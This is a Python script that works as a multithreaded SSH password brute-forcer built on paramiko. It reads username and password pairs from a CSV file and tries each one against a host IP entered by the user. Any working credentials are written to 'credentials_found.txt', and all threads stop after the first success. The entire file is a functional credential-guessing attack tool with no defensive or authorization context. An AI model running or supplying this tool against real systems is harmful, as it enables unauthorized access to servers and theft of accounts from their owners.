from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import csv
import ipaddress
import threading
import time
import logging

# Define terminal color codes
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

# Create an event that will be used to stop all threads when a password is found
stop_event = threading.Event()

# Function to establish an SSH connection
def ssh_connect(host, username, password):
    # If stop_event is set, stop this thread
    if stop_event.is_set():
        return

    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    
    try:
        ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=300)

        with open("credentials_found.txt", "a") as fh:
            print(f"{GREEN}Username - {username} and Password - ******* found.{RESET}")
            fh.write(f"Username: {username}\nPassword: {password}\n Worked on host {host}\n")
        
        # Set the stop event to signal all threads to stop
        stop_event.set()
        
    except AuthenticationException:
        print(f"{RED}Username - {username} and Password - ******* is Incorrect.{RESET}")
    except ssh_exception.SSHException:
        print("**** Attempting to connect - Rate limiting on server ****")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
    finally:
        ssh_client.close()

# Function to get a valid IP address from user input
def get_ip_address():
    while True:
        host = input("Please enter the host IP address: ")
        try:
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            print("Please enter a valid IP address.")

# Main function to read credentials and create threads for SSH connections
def main():
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    list_file = "passwords.csv"
    host = get_ip_address()

    with open(list_file) as fh:
        csv_reader = csv.reader(fh, delimiter=",")
        
        threads = []
        for index, row in enumerate(csv_reader):
            if index == 0:
                continue
            else:
                # Create a thread for each username/password pair
                t = threading.Thread(target=ssh_connect, args=(host, row[0], row[1]))
                threads.append(t)
                t.start()

                time.sleep(0.2)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()

    print(f"FILE THAT HAS THE PASSWORDS IS CALLED 'credentials_found.txt'")

# Standard entry point for Python scripts
if __name__ == "__main__":
    main()